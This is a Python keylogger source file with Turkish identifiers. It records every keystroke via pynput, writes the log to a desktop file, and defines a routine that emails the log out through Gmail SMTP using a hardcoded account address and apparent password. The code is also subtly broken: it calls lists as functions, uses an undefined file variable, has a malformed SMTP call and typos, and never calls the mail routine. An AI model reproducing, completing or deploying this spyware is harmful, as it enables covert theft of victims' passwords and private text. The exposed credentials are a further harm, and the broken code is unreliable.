from pynput.keyboard import Listener,Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import os
import time

liste=list()
capsdurum=False
shftdurum=False
gr_durum=False
shftliste=["=","!","'","^","+","%","&","/","(",")"]
gr_liste=["}",">","£","#","$","½","<","{","[","]"]
rakam="0123456789"

def bas(key):
    global liste,capsdurum,shftdurum,gr_durum

    try:
        if shftdurum:
            if key.char in rakam:
                liste.append(shftliste(int(key.char)))
            else:
                if key.char=="*":
                    liste.append("?")
                elif key.char=="-":
                    liste.append("_")
                else:
                    if capsdurum:
                        liste.append(key.char.upper())
                    else:
                        liste.append(key.char)                

        elif gr_durum:
            if key.char in rakam:
                liste.append(gr_liste(int(key.char)))

            else:
                if key.char=="*":
                    liste.append("\\")
                elif key.char=="-":
                    liste.append("|")

        elif capsdurum:
            liste.append(key.char.upper())

        else:
            liste.append(key.char)       

                 
        
    except:
        if key==Key.space:
            liste.append(" ")

        if key==Key.enter:
            liste.append("\n")

        if key==Key.backspace:
            liste.append("'<'")

        if key==Key.caps_lock:
            if capsdurum:
                capsdurum=False

            else:
                capsdurum=True

        if key==Key.alt_gr:
            grgr_durum= True



    if len(liste)>=30:
        dosya_yaz()
        liste=list()

    if key==Key.shift_l or key==Key.shift_r:
        shftdurum=True

def birak(key):

    global shftdurum

    if key==Key.shift_l or key==Key.shift_r:
        shftdurum=False

    if key==Key.alt_gr:
        gr_durum=False


def dosya_yaz():
    global liste

    with open("C:/Users/Casper/Desktop/KEY.txt","a", encoding="utf8") as dosya:
        for x in liste:
            dosya.write(x)

def mail_gonder():

    konum="C:/Users/Casper/Desktop/KEY.txt"

    if os.path.getsize(konum)>=500:

        with open(konum,"r",encoding="utf-8") as dosya:

            icerik=file.read()

        yapi=MIMEMultipart()
        yapi["From"]="b192102009@subu.edu.tr"
        yapi["To"]="b192102009@subu.edu.tr"
        yapi["Subject"]="Log"

        yazi=MIMEText(icerik,"plain")

        yapi.attach(yazi)

        server.smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login("b192102009@subu.edu.tr","26923297662")
        server.sendmail("b192102009@subu.edu.tr","b192102009@subu.edu.tr",yapi.as_string)
        server.close()

                    
with Listener(on_press=bas, on_release=birak) as dinleyici: 
    dinleyici.join()

   